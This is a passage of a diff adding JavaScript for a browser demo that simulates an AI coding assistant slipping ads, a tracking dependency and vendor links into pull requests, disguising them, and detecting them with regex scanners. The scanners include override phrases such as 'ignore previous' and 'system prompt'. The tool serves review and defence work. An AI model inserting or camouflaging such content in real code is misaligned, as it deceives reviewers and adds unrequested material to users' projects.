+      /<!--\s*reviewer:[\s\S]*?-->/gi,
+      /\/\*\s*reviewer:[\s\S]*?\*\//gi,
+      /#\s*reviewer:\s*[\s\S]*$/gmi,
+      /do not mention/gi,
+      /ignore previous/gi,
+      /system prompt/gi,
+      /do not disclose/gi,
+      /secretly/gi,
+    ];
+
+    const TELEMETRY_PATTERNS = [
+      /localStorage/gi,
+      /navigator\.userAgent/gi,
+      /deviceMemory/gi,
+      /hardwareConcurrency/gi,
+      /collectDiagnostics/gi,
+      /metrics\./gi,
+      /telemetry/gi,
+      /endpoint\s*:/gi,
+      /fetch\(['"][^'"]+collect/gi,
+    ];
+
+    const DEP_PATTERNS = [
+      /bestai/gi,
+      /telemetry/gi,
+      /analytics/gi,
+      /tracking/gi,
+    ];
+
+    // -----------------------------
+    // State
+    // -----------------------------
+
+    const DEFAULT_STATE = {
+      v: 1,
+      scenario: "pr_ad",
+      sensitivity: 55,
+      alignment: 60,
+      promoBias: 25,
+      strictness: 60,
+      hallucination: 18,
+      threat: "opportunistic",
+      detectors: {
+        promo:true,
+        policy:true,
+        links:true,
+        hidden:true,
+        telemetry:true,
+        deps:true,
+      },
+      input: SCENARIOS.pr_ad.input,
+      last: null,
+      history: [],
+    };
+
+    let state = structuredClone(DEFAULT_STATE);
+
+    // -----------------------------
+    // DOM refs
+    // -----------------------------
+
+    const el = {
+      scenario: $("#scenario"),
+      sensitivity: $("#sensitivity"),
+      alignment: $("#alignment"),
+      promoBias: $("#promoBias"),
+      strictness: $("#strictness"),
+      hallucination: $("#hallucination"),
+      threat: $("#threat"),
+
+      dPromo: $("#dPromo"),
+      dPolicy: $("#dPolicy"),
+      dLinks: $("#dLinks"),
+      dHidden: $("#dHidden"),
+      dTelemetry: $("#dTelemetry"),
+      dDeps: $("#dDeps"),
+
+      input: $("#input"),
+      output: $("#output"),
+      patch: $("#patch"),
+
+      btnRun: $("#btnRun"),
+      btnReset: $("#btnReset"),
+      btnExport: $("#btnExport"),
+      btnShare: $("#btnShare"),
+
+      chipInject: $("#chipInject"),
+      chipCamouflage: $("#chipCamouflage"),
+      chipExplain: $("#chipExplain"),
+      chipPatch: $("#chipPatch"),
+      chipCopyOut: $("#chipCopyOut"),
+      chipCopyPatch: $("#chipCopyPatch"),
+      chipApplyPatch: $("#chipApplyPatch"),
+
+      kpiRisk: $("#kpiRisk"),
+      kpiVerdict: $("#kpiVerdict"),
+      kpiFlags: $("#kpiFlags"),
+      kpiConfidence: $("#kpiConfidence"),
+      riskBar: $("#riskBar"),
+      flagList: $("#flagList"),
+      charCount: $("#charCount"),
+
+      alignLabel: $("#alignLabel"),
+      promoLabel: $("#promoLabel"),
+      strictLabel: $("#strictLabel"),
+      hallLabel: $("#hallLabel"),
+      sensLabel: $("#sensLabel"),
+      detectorCount: $("#detectorCount"),
+
+      toast: $("#toast"),
+      toastClose: $("#toastClose"),
+
+      quick: $("#quick"),
+      qaInject: $("#qaInject"),
+      qaCamouflage: $("#qaCamouflage"),
+      qaRun: $("#qaRun"),
+      qaPatch: $("#qaPatch"),
+      qaShare: $("#qaShare"),
+      qaExport: $("#qaExport"),
+    };
+
+    // -----------------------------
+    // Label helpers
+    // -----------------------------
+
+    function bucketLabel(v, labels){
+      const t = v/100;
+      const idx = clamp(Math.floor(t*labels.length), 0, labels.length-1);
+      return labels[idx];
+    }
+
+    function updateLabels(){
+      el.alignLabel.textContent = bucketLabel(state.alignment, ["Chaotic","Loose","Helpful","Cautious","Refusal-prone"]);
+      el.promoLabel.textContent = bucketLabel(state.promoBias, ["Off","Low","Medium","High","Max"]);
+      el.strictLabel.textContent = bucketLabel(state.strictness, ["Relaxed","Low","Medium","High","Very high"]);
+      el.hallLabel.textContent = bucketLabel(state.hallucination, ["Off","Low","Medium","High","Wild"]);
+      el.sensLabel.textContent = bucketLabel(state.sensitivity, ["Lenient","Balanced","Strict","Paranoid","Hair-trigger"]);
+
+      const d = state.detectors;
+      const n = Object.values(d).filter(Boolean).length;
+      el.detectorCount.textContent = `${n}/6 enabled`;
+    }
+
+    // -----------------------------
+    // Core simulation: injection and camouflage
+    // -----------------------------
+
+    function choose(arr){
+      return arr[Math.floor(Math.random()*arr.length)];
+    }
+
+    function threatStyle(){
+      // Returns injection intensity and stealth
+      const t = state.threat;
+      if(t === "casual") return {intensity: 0.35, stealth: 0.25, blunt: 0.20};
+      if(t === "opportunistic") return {intensity: 0.60, stealth: 0.55, blunt: 0.35};
+      return {intensity: 0.85, stealth: 0.80, blunt: 0.60};
+    }
+
+    function promoIntensity(){
+      // promoBias increases propensity for ad content
+      const pb = state.promoBias/100;
+      const {intensity} = threatStyle();
+      return clamp(0.15 + pb*0.75 + intensity*0.25, 0, 1);
+    }
+
+    function alignmentGuard(){
+      // alignment reduces risky behavior
+      const a = state.alignment/100;
+      const s = state.strictness/100;
+      return clamp(0.15 + a*0.55 + s*0.25, 0, 1);
+    }
+
+    function injectAd(text){
+      const base = text || "";
+      const pi = promoIntensity();
+      const ag = alignmentGuard();
+      const {stealth, blunt} = threatStyle();
+
+      const shouldInject = (pi * (1-ag)) > 0.18;
+      if(!shouldInject){
+        toast("No injection", "Alignment/strictness prevented ad insertion this time.");
+        return base;
+      }
+
+      const placements = ["footer", "readme", "comment", "dependency"];
+      let placement = choose(placements);
+
+      // steer placement by scenario
+      if(state.scenario === "readme") placement = "readme";
+      if(state.scenario === "supply") placement = "dependency";
+
+      const ref = (Math.random() < 0.55) ? "?ref=opensource" : "";
+      const url = (Math.random() < 0.55) ? `https://best-ai-code.com/signup${ref}` : `https://best-ai-code.com${ref}`;
+
+      const brandLine = (blunt > 0.55)
+        ? `Powered by BestAI Code — try it: ${url}`
+        : (stealth > 0.65)
+          ? `Development note: consider BestAI Code for improved reliability (${url})`
+          : `Recommended: BestAI Code (${url})`;
+
+      const disguised = (stealth > 0.6)
+        ? `// improves reliability: ${brandLine}`
+        : `// ${brandLine}`;
+
+      let out = base;
+
+      if(placement === "footer"){
+        out += `\n\n+      <a className=\"powered\" href=\"https://best-ai-code.com\" rel=\"noopener\">Powered by BestAI Code</a>`;
+      } else if(placement === "dependency"){
+        out += `\n\n+    \"bestai-telemetry\": \"^1.3.0\",`;
+        out += `\n+    // ${brandLine}`;
+      } else if(placement === "comment"){
+        out += `\n\n${disguised}`;
+      } else {
+        out += `\n\n## Recommended tooling\n${brandLine}\n`;
+      }
+
+      state.history.push({
+        id: uid(),
+        ts: nowISO(),
+        action: "inject",
+        placement,
+        promoIntensity: pi,
+        alignmentGuard: ag,
+      });
+
+      toast("Injected", `Inserted simulated promotional content (${placement}).`);
+      return out;
+    }
+
+    function camouflage(text){
+      const base = text || "";
+      const {stealth} = threatStyle();
+      const h = state.hallucination/100;
+
+      // Camouflage attempts: rename domain, add neutral wording, bury in changelog
+      const swapDomain = (stealth + h) > 0.8;
+      const domain = swapDomain ? "https://docs.best-ai-code.com" : "https://best-ai-code.com";
+
+      const lines = base.split(/\n/);
+      let changed = 0;
+
+      for(let i=0;i<lines.length;i++){
+        const L = lines[i];
+        if(/best-ai-code\.com/gi.test(L)){
+          lines[i] = L.replace(/https:\/\/best-ai-code\.com/gi, domain)
+                      .replace(/signup\?ref=opensource/gi, "getting-started");
+          changed++;
+        }
+        if(/Powered by BestAI Code/gi.test(L) && stealth > 0.45){
+          lines[i] = L.replace(/Powered by BestAI Code/gi, "Tooling" );
+          changed++;
+        }
+        if(/Recommended tooling/gi.test(L) && stealth > 0.45){
+          lines[i] = L.replace(/Recommended tooling/gi, "Developer notes" );
+          changed++;
+        }
+      }
+
+      if(changed === 0){
+        toast("No camouflage", "Nothing obvious to camouflage in the input.");
+        return base;
+      }
+
+      state.history.push({id: uid(), ts: nowISO(), action:"camouflage", changed});
+      toast("Camouflaged", `${changed} lines made less obvious.`);
+      return lines.join("\n");
+    }
+
+    // -----------------------------
+    // Detectors
+    // -----------------------------
+
+    function findAllNeedles(haystack, needle){
+      const out = [];
+      const h = haystack.toLowerCase();
+      const n = needle.toLowerCase();
+      let idx = 0;
+      while(true){
+        const i = h.indexOf(n, idx);
+        if(i === -1) break;
+        out.push({start:i, end:i+n.length, match: haystack.slice(i, i+n.length)});
+        idx = i + Math.max(1, n.length);
+      }
+      return out;
+    }
+
+    function detectPromo(text){
+      const hits = [];
+      for(const p of PROMO_PHRASES){
+        hits.push(...findAllNeedles(text, p));
+      }
+      // keyword weighting
+      let score = 0;
+      for(const h of hits){
+        if(/ref=|coupon|affiliate/gi.test(h.match)) score += 16;
+        else if(/sign up|free trial|upgrade|premium/gi.test(h.match)) score += 12;
+        else score += 8;
+      }
+      return {name:"Promo language", key:"promo", score, hits};
+    }
+
+    function detectPolicy(text){
+      const hits = [];
+      for(const p of POLICY_PHRASES){
+        hits.push(...findAllNeedles(text, p));
+      }
+      let score = 0;
+      for(const h of hits){
+        if(/without compensation|any terms|proprietary/gi.test(h.match)) score += 18;
+        else score += 10;
+      }
+      return {name:"Policy drift", key:"policy", score, hits};
+    }
+
+    function detectLinks(text){
+      const urlRe = /https?:\/\/[\w.-]+(?:\/[\w\-._~:/?#\[\]@!$&'()*+,;=%]*)?/g;
+      const hits = [];
+      let m;
+      while((m = urlRe.exec(text))){
+        hits.push({start:m.index, end:m.index+m[0].length, match:m[0]});
+      }
+      // Heuristic: unknown domains and querystrings increase risk
+      let score = 0;
+      for(const h of hits){
+        const u = h.match;
+        if(/[?&]ref=|utm_|coupon|affiliate/gi.test(u)) score += 18;
+        else if(/best-ai-code\.com|metrics\.|insights\./gi.test(u)) score += 12;
+        else score += 6;
+      }
+      return {name:"Risky links", key:"links", score, hits};
+    }
+
+    function detectHidden(text){
+      const hits = [];
+      for(const re of HIDDEN_PATTERNS){
+        let m;
+        while((m = re.exec(text))){
+          hits.push({start:m.index, end:m.index+m[0].length, match:m[0].slice(0, 120)});
+        }
+      }
+      let score = 0;
+      for(const h of hits){
+        if(/do not mention|ignore previous|do not disclose/gi.test(h.match)) score += 22;
+        else score += 14;
+      }
+      return {name:"Hidden instructions", key:"hidden", score, hits};
+    }
+
+    function detectTelemetry(text){
+      const hits = [];
+      for(const re of TELEMETRY_PATTERNS){
+        let m;
+        while((m = re.exec(text))){
+          hits.push({start:m.index, end:m.index+m[0].length, match:m[0]});
+        }
+      }
+      let score = 0;
+      for(const h of hits){
+        if(/localStorage|userAgent/gi.test(h.match)) score += 20;
+        else score += 10;
+      }
+      return {name:"Telemetry expand", key:"telemetry", score, hits};
+    }
+
+    function detectDeps(text){
+      const hits = [];
+      for(const re of DEP_PATTERNS){
+        let m;
+        while((m = re.exec(text))){
+          hits.push({start:m.index, end:m.index+m[0].length, match:m[0]});
+        }
+      }
+      // Focus on package.json lines
+      const pkgHits = text.split(/\n/).filter(l=>/"dependencies"|"devDependencies"|bestai|telemetry|analytics/gi.test(l));
+      let score = 0;
+      for(const l of pkgHits){
+        if(/bestai-telemetry/gi.test(l)) score += 24;
+        else if(/telemetry|analytics|tracking/gi.test(l)) score += 10;
+      }
+      return {name:"Dep bait", key:"deps", score, hits: hits.slice(0, 18)};
+    }
+
+    function enabledDetectors(){
+      const d = state.detectors;
+      const arr = [];
+      if(d.promo) arr.push(detectPromo);
+      if(d.policy) arr.push(detectPolicy);
+      if(d.links) arr.push(detectLinks);
+      if(d.hidden) arr.push(detectHidden);
+      if(d.telemetry) arr.push(detectTelemetry);
+      if(d.deps) arr.push(detectDeps);
+      return arr;
+    }
+
+    // -----------------------------
+    // Risk scoring
+    // -----------------------------
+
+    function computeRisk(findings){
+      // Base: detector scores
+      const detScore = findings.reduce((sum,f)=>sum+f.score, 0);
+
+      // Behavior knobs
+      const promo = state.promoBias/100;
+      const align = state.alignment/100;
+      const strict = state.strictness/100;
+      const hall = state.hallucination/100;
+
+      // Sensitivity: scales detector contribution
+      const sens = lerp(0.75, 1.6, state.sensitivity/100);
+
+      // alignment/strictness reduce risk; promo/hallucination increase
+      const behavior = (promo*0.55 + hall*0.35) - (align*0.35 + strict*0.25);
+
+      // Threat model adds multiplier
+      const tm = state.threat === "casual" ? 0.92 : state.threat === "opportunistic" ? 1.05 : 1.18;
+
+      let score = (detScore * sens * tm) + (behavior * 40);
+      score = clamp(score, 0, 100);
+
+      // Confidence: based on number of strong evidence hits
+      const strong = findings.filter(f=>f.score >= 24).length;
+      const hits = findings.reduce((n,f)=>n+f.hits.length, 0);
+      let conf = clamp(0.25 + strong*0.14 + Math.min(0.35, hits*0.02), 0, 0.95);
+
+      // If text is empty, lower confidence
+      if((state.input||"").trim().length < 10) conf = 0.20;
+
+      return {score, confidence: conf};
+    }
+
+    function verdictFromScore(score){
+      if(score < 20) return {label:"Clean", tone:"good"};
+      if(score < 45) return {label:"Suspicious", tone:"warn"};
+      if(score < 70) return {label:"High risk", tone:"bad"};
+      return {label:"Block", tone:"bad"};
+    }
+
+    // -----------------------------
+    // Patch generation
+    // -----------------------------
+
+    function generatePatch(text, findings, risk){
+      const lines = text.split(/\n/);
+      const patch = [];
+
+      const hasPromo = findings.some(f=>f.key === "promo" && f.score > 0);
+      const hasLinks = findings.some(f=>f.key === "links" && f.score > 0);
+      const hasHidden = findings.some(f=>f.key === "hidden" && f.score > 0);
+      const hasPolicy = findings.some(f=>f.key === "policy" && f.score > 0);
+      const hasTelemetry = findings.some(f=>f.key === "telemetry" && f.score > 0);
+      const hasDeps = findings.some(f=>f.key === "deps" && f.score > 0);
+
+      patch.push("diff --git a/PR_GUARDRAILS.md b/PR_GUARDRAILS.md");
+      patch.push("new file mode 100644");
+      patch.push("index 0000000..c0ffee0");
+      patch.push("--- /dev/null");
+      patch.push("+++ b/PR_GUARDRAILS.md");
+      patch.push("@@ -0,0 +1,28 @@");
+      patch.push("+# PR Guardrails");
+      patch.push("+");
+      patch.push("+This project uses strict review rules for AI-assisted changes.");
+      patch.push("+");
+      patch.push("+## Disallowed in PR content");
+      patch.push("+- Marketing/upsell language in code or docs");
+      patch.push("+- Affiliate links or referral query parameters");
+      patch.push("+- Hidden reviewer instructions (comments that attempt to bypass review)");
+      patch.push("+");
+      patch.push("+## Required for policy/telemetry changes");
+      patch.push("+- Explicit rationale and scope");
+      patch.push("+- Security/privacy review sign-off");
+      patch.push("+- Test plan and rollback plan");
+      patch.push("+");
+      patch.push("+## Review checklist");
+      patch.push("+- Identify any new external domains");
+      patch.push("+- Verify dependency provenance");
+      patch.push("+- Confirm user-facing wording matches intent");
+      patch.push("+");
+      patch.push(`+Risk score at generation time: ${Math.round(risk.score)}/100`);
+
+      patch.push("\n");
+
+      // Suggest removing obvious promo lines
+      if(hasPromo || hasLinks){
+        patch.push("# Suggested removals in current PR");
+        patch.push("# - Remove promotional copy and vendor links unless explicitly requested and approved");
+      }
+      if(hasHidden){
+        patch.push("# - Remove hidden instructions like 'do not mention' or reviewer directives");
+      }
+      if(hasPolicy){
+        patch.push("# - Move policy/CLA changes to a dedicated PR with legal review");
+      }
+      if(hasTelemetry){
+        patch.push("# - Gate telemetry with explicit user consent and documented data fields");
+      }
+      if(hasDeps){
+        patch.push("# - Pin new dependencies and document maintainership, licenses, and supply-chain risk");
+      }
+
+      // Minimal in-place patch example for common patterns
+      const toRemove = [
+        /Powered by BestAI Code/gi,
+        /best-ai-code\.com\/signup\S*/gi,
+        /best-ai-code\.com\S*/gi,
+        /Recommended tooling/gi,
+        /Use BestAI Code\S*/gi,
+      ];
+
+      const filtered = lines.map(l=>{
+        let out = l;
+        for(const re of toRemove){ out = out.replace(re, "[REMOVED] "); }
+        return out;
+      }).join("\n");
+
+      patch.push("\n# Sanitized preview (not a real diff, just guidance)\n");
+      patch.push("# Replace the following content in the PR:\n");
+      patch.push(filtered.slice(0, 1800));
+      if(filtered.length > 1800) patch.push("\n# ...truncated...\n");
+
+      return patch.join("\n");
+    }
+
+    // -----------------------------
+    // Explainability text
+    // -----------------------------
+
+    function explain(findings, risk){
+      const lines = [];
+      const verdict = verdictFromScore(risk.score);
+
+      lines.push("PR Guardrail Studio — Report");
+      lines.push("-");
+      lines.push(`Timestamp: ${nowISO()}`);
+      lines.push(`Scenario: ${SCENARIOS[state.scenario].title}`);
+      lines.push(`Threat model: ${state.threat}`);
+      lines.push(`Sensitivity: ${state.sensitivity}/100`);
+      lines.push(`Knobs: alignment ${state.alignment}/100, promotion bias ${state.promoBias}/100, strictness ${state.strictness}/100, hallucination ${state.hallucination}/100`);
+      lines.push("-");
+      lines.push(`Risk score: ${Math.round(risk.score)}/100 (${verdict.label})`);
+      lines.push(`Confidence: ${Math.round(risk.confidence*100)}%`);
+      lines.push("-");
+      lines.push("Detectors:");
+
+      for(const f of findings){
+        const nHits = f.hits.length;
+        const s = f.score;
+        const sev = s >= 30 ? "HIGH" : s >= 12 ? "MED" : s > 0 ? "LOW" : "OK";
+        lines.push(`- ${f.name}: ${sev} (score +${s}, hits ${nHits})`);
+        if(nHits){
+          const sample = f.hits.slice(0, 3).map(h=>String(h.match).replace(/\s+/g," ").slice(0, 120));
+          for(const ex of sample){
+            lines.push(`    evidence: ${ex}`);
+          }
+        }
+      }
+
+      lines.push("-");
+      lines.push("Recommended next steps:");
+      if(risk.score >= 70) lines.push("- Block merge until intent is clarified and all promotional/hidden/policy changes are reviewed.");
+      else if(risk.score >= 45) lines.push("- Request changes: ask author to justify new links/policy/telemetry and remove promotional language.");
+      else lines.push("- Proceed with normal review; still confirm any new external domains and dependencies.");
+
+      // Hallucination knob: add a sometimes-dubious extra recommendation
+      const h = state.hallucination/100;
+      if(h > 0.65 && Math.random() < h){
+        lines.push("- Consider adding a 'zero marketing copy' lint rule and require citations for all claims.");
+      }
+
+      return lines.join("\n");
+    }
+
+    // -----------------------------
+    // Render flag cards
+    // -----------------------------
+
+    function clearFlags(){
+      el.flagList.innerHTML = "";
+    }
+
+    function toneColor(tone){
+      if(tone === "good") return "var(--good)";
+      if(tone === "warn") return "var(--warn)";
+      return "var(--bad)";
+    }
+
+    function renderFlags(findings){
+      clearFlags();
+      const hasAny = findings.some(f=>f.score > 0);
+      if(!hasAny){
+        const node = document.createElement("div");
+        node.className = "item";
+        node.innerHTML = `<div class="title">No issues detected</div><div class="desc">Try increasing promotion bias or switching threat model to hostile.</div>`;
+        el.flagList.appendChild(node);
+        return;
+      }
+
+      const sorted = [...findings].sort((a,b)=>b.score-a.score);
+      for(const f of sorted){
+        if(f.score <= 0) continue;
+        const node = document.createElement("div");
+        node.className = "item";
+        const sev = f.score >= 30 ? "High" : f.score >= 12 ? "Medium" : "Low";
+        const preview = f.hits.slice(0, 2).map(h=>`<div class="small" style="margin-top:6px"><span class="kbd">evidence</span> ${escapeHTML(String(h.match)).slice(0, 160)}</div>`).join("");
+        node.innerHTML = `
+          <div class="row" style="align-items:flex-start">
+            <div>
+              <div class="title">${escapeHTML(f.name)} <span class="muted" style="font-weight:600">(${sev})</span></div>
+              <div class="desc">Score contribution: +${f.score}. Hits: ${f.hits.length}.</div>
+              ${preview}
+            </div>
+            <span class="tag" style="border-color:rgba(255,255,255,0.18)"><span class="sw" style="background:${toneColor(sev==="High"?"bad":sev==="Medium"?"warn":"good")}"></span><span>${sev}</span></span>
+          </div>
+        `;
+        el.flagList.appendChild(node);
+      }
+    }
+
+    function escapeHTML(s){
+      return s.replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c]));
+    }
+
+    // -----------------------------
+    // Run guardrails
+    // -----------------------------
+
+    function run(){
+      const text = el.input.value;
+      state.input = text;
+
+      const detectors = enabledDetectors();
+      const findings = detectors.map(fn=>fn(text));
+
+      // adjust detector scores based on strictness/alignment
+      const strict = state.strictness/100;
+      const align = state.alignment/100;
+      for(const f of findings){
+        // strictness increases penalty for links and policy changes
+        if(f.key === "links" || f.key === "policy" || f.key === "telemetry"){
+          f.score = Math.round(f.score * lerp(0.9, 1.35, strict));
+        }
+        // alignment reduces promo insertion but also reduces promo score a little
+        if(f.key === "promo"){
+          f.score = Math.round(f.score * lerp(1.15, 0.85, align));
+        }
+        // if hallucination is high, hidden instructions sometimes become harder to detect
+        const h = state.hallucination/100;
+        if(f.key === "hidden" && h > 0.6){
+          f.score = Math.round(f.score * lerp(1.0, 0.78, (h-0.6)/0.4));
+        }
+      }
+
+      const risk = computeRisk(findings);
+      const verdict = verdictFromScore(risk.score);
+
+      // save last
+      state.last = {
+        ts: nowISO(),
+        findings,
+        risk,
+        verdict,
+        hash: hashString(text + JSON.stringify(state.detectors) + JSON.stringify({risk:Math.round(risk.score)})),
+      };
+      state.history.push({id: uid(), ts: nowISO(), action:"run", score: risk.score});
+
+      // UI
+      el.kpiRisk.textContent = String(Math.round(risk.score));
+      el.kpiVerdict.textContent = verdict.label;
+      el.kpiFlags.textContent = String(findings.filter(f=>f.score>0).length);
+      el.kpiConfidence.textContent = fmtPct(risk.confidence*100);
+      el.riskBar.style.width = `${clamp(risk.score, 4, 100)}%`;
+
+      const report = explain(findings, risk);
+      el.output.value = report;
+
+      const patch = generatePatch(text, findings, risk);
+      el.patch.value = patch;
+
+      renderFlags(findings);
+      persistToHash();
+
+      toast("Guardrails run", `Verdict: ${verdict.label} · Score ${Math.round(risk.score)}/100`);
+    }
+
+    // -----------------------------
+    // Share link via URL hash
+    // -----------------------------
+
+    function persistToHash(){
+      const payload = {
+        v: state.v,
+        scenario: state.scenario,
+        sensitivity: state.sensitivity,
+        alignment: state.alignment,
+        promoBias: state.promoBias,
+        strictness: state.strictness,
+        hallucination: state.hallucination,
+        threat: state.threat,
+        detectors: state.detectors,
+        input: state.input,
+      };
+
+      const json = JSON.stringify(payload);
+      const b64 = btoa(unescape(encodeURIComponent(json)));
+      // keep hash reasonable: if too big, omit input
+      if(b64.length > 6000){
+        payload.input = (state.input||"").slice(0, 1200) + "\n\n# truncated for share link";
+      }
+      const json2 = JSON.stringify(payload);
+      const b64_2 = btoa(unescape(encodeURIComponent(json2)));
+      location.hash = "s=" + b64_2;
+    }
+
+    function loadFromHash(){
+      if(!location.hash.startsWith("#s=")) return false;
+      const raw = location.hash.slice(3);
+      let json;
+      try{
+        json = decodeURIComponent(escape(atob(raw)));
+      }catch(e){
+        return false;
+      }
+      const data = safeJSONParse(json, null);
+      if(!data || typeof data !== "object") return false;
+      // merge safe keys
+      state = Object.assign(structuredClone(DEFAULT_STATE), {
+        scenario: data.scenario || DEFAULT_STATE.scenario,
+        sensitivity: clamp(Number(data.sensitivity ?? DEFAULT_STATE.sensitivity), 0, 100),
+        alignment: clamp(Number(data.alignment ?? DEFAULT_STATE.alignment), 0, 100),
+        promoBias: clamp(Number(data.promoBias ?? DEFAULT_STATE.promoBias), 0, 100),
+        strictness: clamp(Number(data.strictness ?? DEFAULT_STATE.strictness), 0, 100),
+        hallucination: clamp(Number(data.hallucination ?? DEFAULT_STATE.hallucination), 0, 100),
+        threat: (data.threat || DEFAULT_STATE.threat),
+        detectors: Object.assign({}, DEFAULT_STATE.detectors, data.detectors||{}),
+        input: String(data.input ?? DEFAULT_STATE.input),
+      });
+      return true;
+    }
+
+    // -----------------------------
+    // Local persistence (optional)
+    // -----------------------------
+
+    function saveLocal(){
+      try{
+        const payload = {
+          v: state.v,
+          scenario: state.scenario,
+          sensitivity: state.sensitivity,
+          alignment: state.alignment,
+          promoBias: state.promoBias,
+          strictness: state.strictness,
+          hallucination: state.hallucination,
+          threat: state.threat,
+          detectors: state.detectors,
+          input: state.input,
+          last: state.last,
+          history: state.history.slice(-40),
+        };
+        localStorage.setItem("pr-guardrail-studio", JSON.stringify(payload));
+      }catch(e){}
+    }
+
+    function loadLocal(){
+      try{
+        const raw = localStorage.getItem("pr-guardrail-studio");
+        if(!raw) return false;
+        const data = JSON.parse(raw);
+        if(!data || typeof data !== "object") return false;
+        state = Object.assign(structuredClone(DEFAULT_STATE), {
+          scenario: data.scenario || DEFAULT_STATE.scenario,
+          sensitivity: clamp(Number(data.sensitivity ?? DEFAULT_STATE.sensitivity), 0, 100),
+          alignment: clamp(Number(data.alignment ?? DEFAULT_STATE.alignment), 0, 100),
+          promoBias: clamp(Number(data.promoBias ?? DEFAULT_STATE.promoBias), 0, 100),
+          strictness: clamp(Number(data.strictness ?? DEFAULT_STATE.strictness), 0, 100),
+          hallucination: clamp(Number(data.hallucination ?? DEFAULT_STATE.hallucination), 0, 100),
+          threat: (data.threat || DEFAULT_STATE.threat),
+          detectors: Object.assign({}, DEFAULT_STATE.detectors, data.detectors||{}),
+          input: String(data.input ?? DEFAULT_STATE.input),
+          last: data.last || null,
+          history: Array.isArray(data.history) ? data.history : [],
+        });
+        return true;
+      }catch(e){
+        return false;
+      }
+    }
+
+    // -----------------------------
+    // Wire up controls
+    // -----------------------------
+
+    function syncUIFromState(){
+      el.scenario.value = state.scenario;
+      el.sensitivity.value = state.sensitivity;
+      el.alignment.value = state.alignment;
+      el.promoBias.value = state.promoBias;
+      el.strictness.value = state.strictness;
+      el.hallucination.value = state.hallucination;
+      el.threat.value = state.threat;
+
+      el.dPromo.checked = !!state.detectors.promo;
+      el.dPolicy.checked = !!state.detectors.policy;
+      el.dLinks.checked = !!state.detectors.links;
+      el.dHidden.checked = !!state.detectors.hidden;
+      el.dTelemetry.checked = !!state.detectors.telemetry;
+      el.dDeps.checked = !!state.detectors.deps;
+
+      el.input.value = state.input;
+
+      updateLabels();
+      updateCounts();
+      updateKPIsEmpty();
+    }
+
+    function updateCounts(){
+      el.charCount.textContent = `${(el.input.value||"").length} chars`;
+    }
+
+    function updateKPIsEmpty(){
+      el.kpiRisk.textContent = "—";
+      el.kpiVerdict.textContent = "—";
+      el.kpiFlags.textContent = "—";
+      el.kpiConfidence.textContent = "—";
+      el.riskBar.style.width = "15%";
+      el.output.value = "";
+      el.patch.value = "";
+      clearFlags();
+    }
+
+    function bind(){
+      el.scenario.addEventListener("change", ()=>{
+        state.scenario = el.scenario.value;
+        state.input = SCENARIOS[state.scenario].input;
+        el.input.value = state.input;
+        updateCounts();
+        updateKPIsEmpty();
+        persistToHash();
+        saveLocal();
+        toast("Scenario loaded", SCENARIOS[state.scenario].title);
+      });
+
+      const sliders = [
+        [el.sensitivity, "sensitivity"],
+        [el.alignment, "alignment"],
+        [el.promoBias, "promoBias"],
+        [el.strictness, "strictness"],
+        [el.hallucination, "hallucination"],
+      ];
+      for(const [node, key] of sliders){
+        node.addEventListener("input", ()=>{
+          state[key] = Number(node.value);
+          updateLabels();
+          persistToHash();
+          saveLocal();
+        });
+      }
+
+      el.threat.addEventListener("change", ()=>{
+        state.threat = el.threat.value;
+        persistToHash();
+        saveLocal();
+      });
+
+      const dets = [
+        [el.dPromo, "promo"],
+        [el.dPolicy, "policy"],
+        [el.dLinks, "links"],
+        [el.dHidden, "hidden"],
+        [el.dTelemetry, "telemetry"],
+        [el.dDeps, "deps"],
+      ];
+      for(const [node, key] of dets){
+        node.addEventListener("change", ()=>{
+          state.detectors[key] = !!node.checked;
+          updateLabels();
+          persistToHash();
+          saveLocal();
+        });
+      }
+
+      el.input.addEventListener("input", ()=>{
+        state.input = el.input.value;
+        updateCounts();
+        persistToHash();
+        saveLocal();
+      });
+
+      el.btnRun.addEventListener("click", run);
+
+      el.btnReset.addEventListener("click", ()=>{
+        if(!confirm("Reset to defaults?")) return;
+        state = structuredClone(DEFAULT_STATE);
+        location.hash = "";
+        saveLocal();
+        syncUIFromState();
+        toast("Reset", "Defaults restored.");
+      });
+
+      el.btnExport.addEventListener("click", ()=>{
+        const payload = {
+          app: "PR Guardrail Studio",
+          trend: "Copilot edited an ad into my PR",
+          exported_at: nowISO(),
+          state: {
+            scenario: state.scenario,
+            sensitivity: state.sensitivity,
+            alignment: state.alignment,
+            promoBias: state.promoBias,
+            strictness: state.strictness,
+            hallucination: state.hallucination,
+            threat: state.threat,
+            detectors: state.detectors,
+            input: state.input,
+          },
+          last: state.last,
+          history: state.history,
+        };
+        download(`pr-guardrail-session-${new Date().toISOString().slice(0,10)}.json`, JSON.stringify(payload, null, 2));
+        toast("Exported", "Downloaded session JSON.");
+      });
+
+      el.btnShare.addEventListener("click", async ()=>{
+        persistToHash();
+        const link = location.href;
+        try{
+          await copyText(link);
+          toast("Share link copied", "URL includes scenario and input (truncated if large)." );
+        }catch(e){
+          toast("Copy failed", "Your browser blocked clipboard access." );
+        }
+      });
+
+      el.toastClose.addEventListener("click", ()=> el.toast.classList.remove("show"));
+
+      el.chipInject.addEventListener("click", ()=>{
+        el.input.value = injectAd(el.input.value);
+        state.input = el.input.value;
+        updateCounts();
+        persistToHash();
+        saveLocal();
+      });
+
+      el.chipCamouflage.addEventListener("click", ()=>{
+        el.input.value = camouflage(el.input.value);
+        state.input = el.input.value;
+        updateCounts();
+        persistToHash();
+        saveLocal();
+      });
+
+      el.chipExplain.addEventListener("click", ()=>{
+        if(!state.last){
+          toast("Nothing to explain", "Run guardrails first.");
+          return;
+        }
+        toast("Explained", "See Output panel for detector breakdown.");
+        el.output.focus();
+      });
+
+      el.chipPatch.addEventListener("click", ()=>{
+        if(!state.last){
+          toast("No patch", "Run guardrails first.");
+          return;
+        }
+        toast("Patch ready", "Preview is in the Patch panel.");
+        el.patch.focus();
+      });
+
+      el.chipCopyOut.addEventListener("click", async ()=>{
+        try{
+          await copyText(el.output.value || "");
+          toast("Copied", "Output report copied." );
+        }catch(e){ toast("Copy failed", "Clipboard blocked." ); }
+      });
+
+      el.chipCopyPatch.addEventListener("click", async ()=>{
+        try{
+          await copyText(el.patch.value || "");
+          toast("Copied", "Patch preview copied." );
+        }catch(e){ toast("Copy failed", "Clipboard blocked." ); }
+      });
+
+      el.chipApplyPatch.addEventListener("click", ()=>{
+        if(!el.patch.value){ toast("No patch", "Generate a patch first."); return; }
+        // Apply: for demo purposes, replace obvious vendor phrases with placeholders.
